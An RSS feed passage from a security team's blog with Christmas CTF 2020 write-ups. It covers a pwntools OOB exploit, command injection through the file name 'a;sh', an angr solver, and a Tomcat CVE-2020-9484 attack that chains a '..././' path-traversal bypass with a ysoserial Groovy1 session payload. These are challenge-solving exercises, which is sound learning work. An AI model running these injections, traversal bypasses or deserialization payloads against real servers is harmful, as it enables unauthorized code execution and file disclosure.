class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>]flag = []pre_chk = <span class="hljs-number">0</span><span class="hljs-keyword">while</span>(len(flag) &lt; len(idx)):cur_chk = idx[len(flag)]buf = note[pre_chk:pre_chk+cur_chk]result = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(buf)): <span class="hljs-keyword">if</span>(buf[i] == <span class="hljs-string">&#x27;la&#x27;</span>): result += <span class="hljs-number">0xa</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;ti&#x27;</span>): result += <span class="hljs-number">0xb</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;do&#x27;</span>): result += <span class="hljs-number">0xc</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;re&#x27;</span>): result += <span class="hljs-number">0xd</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;mi&#x27;</span>): result += <span class="hljs-number">0xe</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;fa&#x27;</span>): result += <span class="hljs-number">0xf</span>flag.append(chr(result))print(<span class="hljs-string">&#x27;&#x27;</span>.join(flag))pre_chk += cur_chk</code></pre><pre><code class="hljs plain">XXMXMAXMASXMAS&#123;XMAS&#123;7XMAS&#123;7hXMAS&#123;7heXMAS&#123;7herXMAS&#123;7her3XMAS&#123;7her3_XMAS&#123;7her3_iXMAS&#123;7her3_i5XMAS&#123;7her3_i5_XMAS&#123;7her3_i5_nXMAS&#123;7her3_i5_noXMAS&#123;7her3_i5_no_XMAS&#123;7her3_i5_no_GXMAS&#123;7her3_i5_no_G_XMAS&#123;7her3_i5_no_G_iXMAS&#123;7her3_i5_no_G_inXMAS&#123;7her3_i5_no_G_in_XMAS&#123;7her3_i5_no_G_in_HXMAS&#123;7her3_i5_no_G_in_H3XMAS&#123;7her3_i5_no_G_in_H3XXMAS&#123;7her3_i5_no_G_in_H3X&#125;</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Write-Up/">Write-Up</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/misc/">misc</category>
      
      <category domain="https://hackyboiz.github.io/tags/scale/">scale</category>
      
      <category domain="https://hackyboiz.github.io/tags/hex/">hex</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/29/fabu1ous/no-g/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Write-Up] Christmas CTF 2020 - oil system</title>
      <link>https://hackyboiz.github.io/2020/12/29/fabu1ous/oil-system/</link>
      <guid>https://hackyboiz.github.io/2020/12/29/fabu1ous/oil-system/</guid>
      <pubDate>Tue, 29 Dec 2020 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;머릿말&quot;&gt;&lt;a href=&quot;#머릿말&quot; class=&quot;headerlink&quot; title=&quot;머릿말&quot;&gt;&lt;/a&gt;머릿말&lt;/h1&gt;&lt;p&gt;CVE-2020–15647는 Firefox Fennec v68.9.0에서 발생하는 Arbitrary local file</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="머릿말"><a href="#머릿말" class="headerlink" title="머릿말"></a>머릿말</h1><p>CVE-2020–15647는 Firefox Fennec v68.9.0에서 발생하는 Arbitrary local file access입니다. 파일을 Cache 할 때 해당 파일의 이름을 해쉬 해야 하지만 Firefox Fennec v68.9.0의 <code>content:// URI</code> 로직엔 존재하지 않기 때문에 Arbitrary local file access가 발생합니다. 이런 상황을 pwnable 문제로 구현해봤는데…</p><p><img src="/2020/12/29/fabu1ous/oil-system/1.png"></p><p>unintended solution으로 커멘드 인젝션이 존재합니다. 상위권 솔브가 모두 커멘드 인젝션이더군요… 하하하. 문제 검수 단계에서 커멘드 인젝션에 대한 말이 나와서 수정하고 검증까지 했는데 수정 안된 버전이 대회 때 올라갔네요.</p><p>oil-system 문제를 풀어주신 분들께 정말 죄송합니다. 조금 더 철저하게 준비했어야 됐는데…</p><h1 id="풀이-요약"><a href="#풀이-요약" class="headerlink" title="풀이 요약"></a>풀이 요약</h1><p><img src="/2020/12/29/fabu1ous/oil-system/2.png"></p><p><img src="/2020/12/29/fabu1ous/oil-system/3.png"></p><p>문제 바이너리는 subleq이라는 One-Instruction-Language system 에뮬레이터입니다. subleq 코드를 담고 있는 파일에서 데이터를 읽어와 스택에 저장하고 그 코드를 해석해 동작합니다. subleq코드를 해석하는 함수에 OOB 취약점이 존재해 리턴 값을 조작할 수 있습니다. subleq 코드를 담고 있는 파일을 cache 하는 루틴도 존재하는데 파일의 경로만 바뀔 뿐 파일명을 유지합니다. Write Code 기능으로 flag라는 파일을 생성하고 실제 flag파일이 cache 되도록 리턴 값을 유도하면 됩니다.</p><h1 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h1><ul><li>OOB</li></ul><p><img src="/2020/12/29/fabu1ous/oil-system/4.png"></p><p>위 사진은 함수 subleq()의 코드입니다. a2의 index로 사용되는 v4와 v5의 최댓값이 존재하지 않기 때문에 oob write가 가능합니다. v4와 v5값를 이용해 a2보다 높은 주소에 있는 스택 어디든 참조할 수 있게 되고 리턴 값을 오염시킬 수 있습니다.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">1234</span>)<span class="hljs-comment"># Write Code</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendafter(<span class="hljs-string">&#x27;Enter your Program\&#x27;s Name : &#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Enter Code : &#x27;</span>,<span class="hljs-string">&#x27;4 166 -1 -1 -1054&#x27;</span>)<span class="hljs-comment"># Run Code</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<span class="hljs-comment"># Get flag with View Cached code</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)p.interactive()</code></pre><pre><code class="hljs routeros">[+] Opening<span class="hljs-built_in"> connection </span><span class="hljs-keyword">to</span> localhost on<span class="hljs-built_in"> port </span>1234: Done[*] Switching <span class="hljs-keyword">to</span> interactive modeXMAS&#123;U5e_Ma11oc_Nex7_tim3_Mr_Kim&#125; ========[ Menu ]======== 1. Read test description 2. Write Code 3. <span class="hljs-builtin-name">Run</span> Code 4. View Cached code &gt; TIMEOUT[*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactive</code></pre><h1 id="Command-injection"><a href="#Command-injection" class="headerlink" title="Command injection"></a>Command injection</h1><ul><li>unintended solution</li></ul><p><img src="/2020/12/29/fabu1ous/oil-system/5.png"></p><p>파일명 필터 함수입니다. 파일명에 영문 소문자 이외의 입력이 들어온다면 프로세스를 종료합니다. 안타깝게도 유심히 보시면 첫 글자만 검사한다는 것을 알 수 있습니다. <s>문제 만든 놈이 픵신인듯</s></p><pre><code class="hljs plain"> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;[ Menu ]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 1. Read test description 2. Write Code 3. Run Code 4. View Cached code &gt; 2 Enter your Program&#39;s Name : a;sh Enter Code : your an idiot &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;[ Menu ]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 1. Read test description 2. Write Code 3. Run Code 4. View Cached code &gt; 3 Error while fopen$ cat flagXMAS&#123;U5e_Ma11oc_Nex7_tim3_Mr_Kim&#125;$</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Write-Up/">Write-Up</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwnable/">pwnable</category>
      
      <category domain="https://hackyboiz.github.io/tags/oob/">oob</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/29/fabu1ous/oil-system/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Write-Up] Christmas CTF 2020 - angrforge</title>
      <link>https://hackyboiz.github.io/2020/12/29/idioth/christmasctf2020-angrforge/</link>
      <guid>https://hackyboiz.github.io/2020/12/29/idioth/christmasctf2020-angrforge/</guid>
      <pubDate>Tue, 29 Dec 2020 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;출제-의도&quot;&gt;&lt;a href=&quot;#출제-의도&quot; class=&quot;headerlink&quot; title=&quot;출제 의도&quot;&gt;&lt;/a&gt;출제 의도&lt;/h1&gt;&lt;p&gt;angr를 통해 입력 값을 뽑아내는 것이 의도인 문제였습니다. 이 문제는 여러 번의 수정을 거쳤습니다. </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="출제-의도"><a href="#출제-의도" class="headerlink" title="출제 의도"></a>출제 의도</h1><p>angr를 통해 입력 값을 뽑아내는 것이 의도인 문제였습니다. 이 문제는 여러 번의 수정을 거쳤습니다. 원래 이 문제도 arm 환경에서 angr를 돌리는 문제로 낼 예정이었는데 arm에서 제대로 동작하지 않아서 arm은 포기. 그리고 원래 처음에는 c++로 냈었는데 검수 후 수정을 했더니 simulation manager를 돌려도 값이 제대로 나오지 않아서 c로 옮기는 과정에서 연산 몇 개를 뺐습니다..ㅠ</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><pre><code class="hljs apache"><span class="hljs-attribute">idioth</span>@ubuntu:~/Desktop$ file angrforge<span class="hljs-attribute">angrforge</span>: ELF <span class="hljs-number">64</span>-bit LSB shared object, x<span class="hljs-number">86</span>-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked,<span class="hljs-attribute">interpreter</span> /lib<span class="hljs-number">64</span>/ld-linux-x<span class="hljs-number">86</span>-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span>,<span class="hljs-attribute">BuildID</span>[sha<span class="hljs-number">1</span>]=<span class="hljs-number">1162</span>ed<span class="hljs-number">229</span>a<span class="hljs-number">12133</span>d<span class="hljs-number">07</span>de<span class="hljs-number">26301</span>dad<span class="hljs-number">1</span>ada<span class="hljs-number">34</span>a<span class="hljs-number">9</span>c<span class="hljs-number">3</span>ff, for GNU/Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>, stripped</code></pre><p>64bit ELF 파일이며, stripped 되어있습니다.</p><pre><code class="hljs c"><span class="hljs-function">undefined8 <span class="hljs-title">FUN_00103be1</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">int</span> iVar1;  <span class="hljs-keyword">long</span> in_FS_OFFSET;  undefined8 local_58;  undefined8 local_50;  undefined8 local_48;  undefined8 local_40;  undefined8 local_38;  undefined8 local_30;  undefined8 local_28;  undefined local_20;  <span class="hljs-keyword">long</span> local_10;    local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);  local_58 = <span class="hljs-number">0</span>;  local_50 = <span class="hljs-number">0</span>;  local_48 = <span class="hljs-number">0</span>;  local_40 = <span class="hljs-number">0</span>;  local_38 = <span class="hljs-number">0</span>;  local_30 = <span class="hljs-number">0</span>;  local_28 = <span class="hljs-number">0</span>;  local_20 = <span class="hljs-number">0</span>;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;General Angerforge, the Dark Iron responsible for stealing my computer.&quot;</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;But I\&#x27;m just a programmer.. so Call me my best warrior friend.&quot;</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;If you call my friend, I will give you a good reward.&quot;</span>);  fgets((<span class="hljs-keyword">char</span> *)&amp;local_58,<span class="hljs-number">0x39</span>,<span class="hljs-built_in">stdin</span>);  FUN_00103a48(&amp;local_58);  iVar1 = FUN_001039f7(&amp;local_58);  <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">1</span>) &#123;    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OMG, Thank you for your good works :)&quot;</span>);  &#125;  <span class="hljs-keyword">else</span> &#123;    FUN_001039d9();  &#125;  <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span>    __stack_chk_fail();  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>ghidra를 통해 디컴파일을 한 후 main을 확인해보면, <code>0x39(57)</code>만큼의 입력 값을 받아서 <code>FUN_00103a48</code>을 호출하고, <code>FUN_001039f7</code>을 통해 문자열을 체크하는 것을 확인할 수 있습니다.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_00103a48</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *param_1)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">size_t</span> sVar1;    sVar1 = <span class="hljs-built_in">strlen</span>(param_1);  <span class="hljs-keyword">if</span> (sVar1 &lt; (ulong)(<span class="hljs-keyword">long</span>)(<span class="hljs-keyword">int</span>)((DAT_00106014 | DAT_00106010) + <span class="hljs-number">5</span>)) &#123;    FUN_001033e9(param_1);    FUN_00103481(param_1);    FUN_00103519(param_1);    FUN_001035b1(param_1);    FUN_00103649(param_1);    FUN_001036e1(param_1);    FUN_00103779(param_1);    FUN_00103811(param_1);    FUN_001038a9(param_1);    FUN_00103941(param_1);  &#125;  <span class="hljs-keyword">else</span> &#123;    FUN_001011c9(param_1);    FUN_00101396(param_1);    FUN_00101563(param_1);    FUN_00101730(param_1);    FUN_001018fd(param_1);    FUN_00101abf(param_1);    FUN_00101bbf(param_1);    FUN_00101cce(param_1);    FUN_00101dce(param_1);    FUN_00101eee(param_1);    FUN_001022cb(param_1);    FUN_00102589(param_1);    FUN_00102847(param_1);    FUN_00102b05(param_1);    FUN_00102dc3(param_1);    FUN_00102ef9(param_1);    FUN_00103035(param_1);    FUN_00103171(param_1);    FUN_001032ad(param_1);  &#125;  <span class="hljs-keyword">return</span>;&#125;</code></pre><p><code>FUN_00103a48</code> 함수는 입력 값을 받아서, 길이에 따라서 여러 가지 다른 sub 함수를 수행합니다. 각 sub 함수의 연산은 서로 다른 바이트에 영향을 미치지 않고 함수가 다른 함수를 호출하는 로직도 있어서 상당히 복잡하게 얽혀있습니다. c++에는 곱 연산 같은 것도 넣었는데 c로 급하게 옮기면서 보니 바이트가 증발하더군요..ㅠ <del>시간 부족으로 인한 역 연산 가능 로직</del></p><pre><code class="hljs c"><span class="hljs-function">undefined8 <span class="hljs-title">FUN_001039f7</span><span class="hljs-params">(<span class="hljs-keyword">long</span> param_1)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">int</span> local_c;    local_c = <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-number">0x37</span> &lt; local_c) &#123;      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">if</span> (*(<span class="hljs-keyword">char</span> *)(param_1 + local_c) != (&amp;DAT_00104080)[local_c]) <span class="hljs-keyword">break</span>;    local_c = local_c + <span class="hljs-number">1</span>;  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><code>FUN_001039f7</code>에서는 0x38만큼 <code>DAT_00104080</code>과 값을 비교하여 맞으면 <code>1</code>, 아닐 시 <code>0</code>을 리턴해줍니다.</p><p><code>\n</code>을 제외한 문자열의 길이는 56이고, <code>stdin</code>을 통해 입력 값이 들어가므로 입력 값 56과 <code>stdin</code>을 처리하는 state를 구성하여 simulation manager를 돌리면 값을 구할 수 있습니다.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripyp = angr.Project(<span class="hljs-string">&#x27;./angrforge&#x27;</span>)flag_chars = [claripy.BVS(<span class="hljs-string">&#x27;flag_%d&#x27;</span> % i, <span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">56</span>)]flag = claripy.Concat(*flag_chars + [claripy.BVV(<span class="hljs-string">b&#x27;\n&#x27;</span>)])st = p.factory.full_init_state(    stdin = flag,    add_options = angr.options.unicorn,)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag_chars:    st.solver.add(i != <span class="hljs-number">0</span>)    st.solver.add(i != <span class="hljs-number">10</span>)sm = p.factory.simulation_manager(st)sm.run()<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sm.deadended:    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;OMG&#x27;</span> <span class="hljs-keyword">in</span> i.posix.dumps(<span class="hljs-number">1</span>):        print(i.posix.dumps(<span class="hljs-number">0</span>))</code></pre><pre><code class="hljs apache"><span class="hljs-attribute">idioth</span>@ubuntu:~/Desktop$ python<span class="hljs-number">3</span> solve.py<span class="hljs-attribute">WARNING</span> | <span class="hljs-number">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">28</span> <span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">44</span>,<span class="hljs-number">086</span> | cle.loader | The main binary is a position-independent executable.<span class="hljs-attribute">It</span> is being loaded with a base address of <span class="hljs-number">0</span>x<span class="hljs-number">400000</span>.<span class="hljs-attribute">WARNING</span> | <span class="hljs-number">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">28</span> <span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">45</span>,<span class="hljs-number">089</span> | angr.simos.simos | stdin is constrained to <span class="hljs-number">57</span> bytes (has_end=True).<span class="hljs-attribute">If</span> you are only providing the first <span class="hljs-number">57</span> bytes instead of the entire stdin,<span class="hljs-attribute">please</span> use stdin=SimFileStream(name=&#x27;stdin&#x27;, content=your_first_n_bytes, has_end=False).<span class="hljs-attribute">b</span>&#x27;XMAS&#123;h<span class="hljs-number">3</span>_<span class="hljs-number">1</span>s_b<span class="hljs-number">1</span>o<span class="hljs-number">0</span>d<span class="hljs-number">3</span>lf_d<span class="hljs-number">3</span>athkni<span class="hljs-number">9</span>ht_wh<span class="hljs-number">0</span>_will_kill_<span class="hljs-number">4</span>ngrf<span class="hljs-number">0</span>rge&#125;\n&#x27;</code></pre><p>Flag : XMAS{h3_1s_b1o0d3lf_d3athkni9ht_wh0_will_kill_4ngrf0rge}</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Write-Up/">Write-Up</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/reversing/">reversing</category>
      
      <category domain="https://hackyboiz.github.io/tags/angr/">angr</category>
      
      <category domain="https://hackyboiz.github.io/tags/christmas-ctf-2020/">christmas ctf 2020</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/29/idioth/christmasctf2020-angrforge/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Write-Up] Christmas CTF 2020 - gift</title>
      <link>https://hackyboiz.github.io/2020/12/29/idioth/christmasctf2020-gift/</link>
      <guid>https://hackyboiz.github.io/2020/12/29/idioth/christmasctf2020-gift/</guid>
      <pubDate>Tue, 29 Dec 2020 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;출제-의도&quot;&gt;&lt;a href=&quot;#출제-의도&quot; class=&quot;headerlink&quot; title=&quot;출제 의도&quot;&gt;&lt;/a&gt;출제 의도&lt;/h1&gt;&lt;p&gt;올해 초에 발표된 Apache Tomcat CVE-2020-9484를 이용해서 문제를 만들어보고 싶었습니</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="출제-의도"><a href="#출제-의도" class="headerlink" title="출제 의도"></a>출제 의도</h1><p>올해 초에 발표된 Apache Tomcat CVE-2020-9484를 이용해서 문제를 만들어보고 싶었습니다. 문제를 만들면서 이 취약점이 있는 서비스를 만들고 싶은데… 만약 이런 사이트가 있었다면 어떤 식으로 취약점에 접근할 수 있을까?라는 생각을 하면서 만들었습니다.</p><p>session이 저장되는 위치와 자신이 올린 파일이 업로드되는 위치를 모두 알아야 하고 또 해당 취약점에 취약한 버전이라는 것도 알아야 해서 local에 있는 파일을 모두 볼 수 있으면 되겠다는 생각을 했습니다. <del>lock과 angrforge의 허술함은 여기에서 왔다.</del></p><p>RCE를 활용해야 한다는 것과 실행할 파일의 위치를 <code>special.jsp</code>에 넣어놨는데 좀 더 잘 보이는 곳에 넣어둘 걸… 하는 생각을 했습니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image.jpg"></p><p>제가 웹 알못이다 보니 이런저런 것을 구현할 때 주위의 웹 하는 친구들한테 물어보며 이거 이러이러하게 해서 플래그에 접근하는 건데 게싱이 심하지 않을까? 사람들이 이런 식으로 접근할 수 있을까? 내가 이거 어떻게 하는지 잘 몰라서 이렇게 해봤는데 괜찮을까? 물어보면서 만들었습니다. <del>일단 있는 거 다 해보고 파일은 다 찾아본다며</del></p><p>구현을 도와준다던 놈들은 jsp라고 하니까 다 도망가더군요 하하하… 잡설이 길었습니다.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image0.png"></p><p>메인 화면입니다. 저기 깃발(flag) 모양에 Special gift가 숨겨져 있다!라고 되어있습니다. 이걸 description에 적어놨으면 참 좋았을걸 왜 안 적어놨지? 일단 로그인을 해야 기능을 볼 수 있는 것 같으니 로그인을 해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image1.png"></p><p>로그인을 하면 제공하는 기능을 볼 수 있습니다. 사이트에서 제공하는 기능을 정리하면 아래와 같습니다.</p><ul><li><code>Gift List</code><ul><li>전송한 선물의 리스트를 볼 수 있다.</li><li>file name을 <code>GET</code>을 통해 받는다.</li></ul></li><li><code>Send List</code><ul><li>선물을 전송할 수 있다.</li></ul></li><li><code>Community</code><ul><li>게시판 기능으로 글을 작성할 수 있다.</li></ul></li></ul><p>선물을 전송하면 산타가 그 선물을 준다고 하고 gift list에서 올린 선물 리스트의 내용을 확인할 수 있으니 일단 <code>Send List</code>를 통해 선물을 전송하고 난 후 <code>Gift List</code>에서 어떠한 식으로 확인할 수 있는지를 확인해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image2.png"></p><p>txt 파일과 자신들의 secret한 파일만 올릴 수 있다고 하니 일단 txt 파일을 올려봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image3.png"></p><p>전송이 완료된 후 <code>Gift List</code>를 통해 파일 리스트를 확인하면 <code>&lt;name&gt;</code>‘s gift list라는 제목과 함께 업로드한 파일이 표시가 되고 해당 파일의 내용을 확인할 수 있습니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image4.png"></p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image5.png"></p><p>gift list를 불러올 때 사용되는 <code>&lt;name&gt;</code>은 <code>GET</code>을 통해 불러오는 것으로 추정되므로 해당 인자 값을 수정해봅니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image6.png"></p><p>name을 변경하자 testa’s gift list를 읽어오고 아무것도 출력이 안 되는 것을 볼 수 있습니다.</p><p>name에 따라 다른 디렉터리를 생성하고 해당 폴더에 파일이 올라간다는 가설을 세우고 path traversal이 가능한지 확인을 해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image7.png"></p><p>name에 <code>.</code>을 입력하자 아까 위에서 확인한 두 개의 폴더가 나옵니다. 더 위로 올라가 봅시다.</p><p><code>../</code>나 <code>....//</code>은 필터링이 되어 있어 디렉터리 리스팅이 불가능하지만 <code>..././</code>은 가능합니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image8.png"></p><p>해당 폴더에 진입하면 gift 폴더 안에서 username으로 gift list가 관리되고 있음을 알 수 있습니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image9.png"></p><p>한 번 더 올라가면 이러한 디렉터리가 보입니다. tomcat의 상위 디렉터리인데 이를 통해 tomcat을 통해 구동되고 있음을 확인할 수 있습니다. 먼저 웹페이지 소스코드 파일은 webapps에 들어있으므로 해당 디렉터리를 들어가서 어떠한 파일이 있는지 확인해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image10.png"></p><p><code>special.jsp</code>라는 파일이 있네요. 메인에서 special gift가 숨겨져 있다고 했으니 해당 jsp를 확인해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image11.png"></p><p><code>special_gift</code> 파일을 찾아서 실행하면 이 디렉터리에서 특별한 선물을 볼 수 있다고 합니다.</p><p>tomcat 디렉터리로 가서 RELEASE-NOTES의 내용을 확인해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image12.png"></p><p>tomcat-8.5.54 버전에서 동작하고 있습니다. 해당 버전은 CVE-2020-9484 버전에 영향을 받는 버전이고 해당 취약점에 영향을 받는지 확인하는 방법은 아래와 같습니다.</p><ul><li>tomcat이 session을 PersistenceManager를 통해 세션을 관리함</li><li>FileStore를 통해 Directory 경로를 지정함</li><li>arbitrary file upload가 가능하며 해당 파일이 어디에 저장되는지 알 수 있음</li></ul><p>현재 arbitrary file upload가 가능하며 파일이 업로드되는 위치도 알 수 있으므로 <code>conf/context.xml</code>을 통해 PersistenceManager를 사용 중인지, 사용 중이라면 FileStore로 Directory를 지정해서 저장하는지, 저장한다면 session이 저장되는 경로는 어딘지 확인합시다.(아까 위에서 sessions 폴더를 본 것 같긴 한데)</p><p><code>detail.jsp?file=..././..././..././conf/context.xml</code>로 접근하면 <code>conf/context.xml</code>의 내용을 확인할 수 있습니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image13.png"></p><p>PersistentManager, FileStore를 사용하며 session이 저장되는 경로는 <code>/usr/local/tomcat/sessions</code>네요.</p><p>해당 취약점은 session을 deserialize 하면서 일어나는 취약점이므로 gadget도 확인해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image14.png"></p><p><code>/lib</code> 폴더에 <code>groovy-2.3.9.jar</code> 가 존재하는 것을 알 수 있습니다.</p><p>이제 <code>special_gift</code> 파일의 위치를 찾아보면</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image15.png"></p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image16.png"></p><p>최상위 경로에 있는 것을 볼 수 있습니다.(이것도 위치를 알려줬어야…ㅠㅠ) 이제 해당 취약점을 활용하여 <code>special_gift</code> 바이너리를 실행하면 <code>/webapps/ROOT</code> 에 flag 파일이 생성될 것입니다.</p><p>그전에 해당 취약점을 활용하는 것이 맞는지 upload.jsp의 내용으로 올릴 수 있는 special file이 session 파일인지 확인해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image17.png"></p><p>허용되어있는 확장자가 <code>.txt</code>와 <code>.session</code>파일임을 알 수 있습니다!</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image18.png"></p><p>흠.. 일단 exploit 과정을 정리하면 다음과 같습니다.</p><ul><li>file이 업로드되는 경로는 <code>tomcat/media/gift/&lt;name&gt;</code>이다.</li><li>sessions이 저장되는 경로는 <code>tomcat/sessions</code>이다.</li><li><code>special.jsp</code> 에 따르면 <code>/special_gift</code>를 실행하면 flag 파일이 생성된다.</li><li><code>/bin/bash -c /special_gift</code>를 수행하면 <code>special_gift</code> 파일이 실행되고 flag를 확인할 수 있다.</li><li>serialize session 생성</li></ul><pre><code class="hljs pgsql">idioth@ubuntu:~$ java -jar ysoserial.jar Groovy1 &quot;/bin/bash -c /special_gift&quot; &gt; exploit.<span class="hljs-keyword">session</span><span class="hljs-built_in">WARNING</span>: An illegal reflective <span class="hljs-keyword">access</span> operation has occurred<span class="hljs-built_in">WARNING</span>: Illegal reflective <span class="hljs-keyword">access</span> <span class="hljs-keyword">by</span> org.codehaus.groovy.reflection.CachedClass<span class="hljs-meta">$3</span><span class="hljs-meta">$1</span> (file:/home/idioth/ysoserial.jar) <span class="hljs-keyword">to</span> <span class="hljs-keyword">method</span> java.lang.<span class="hljs-keyword">Object</span>.finalize()<span class="hljs-built_in">WARNING</span>: Please consider reporting this <span class="hljs-keyword">to</span> the maintainers <span class="hljs-keyword">of</span> org.codehaus.groovy.reflection.CachedClass<span class="hljs-meta">$3</span><span 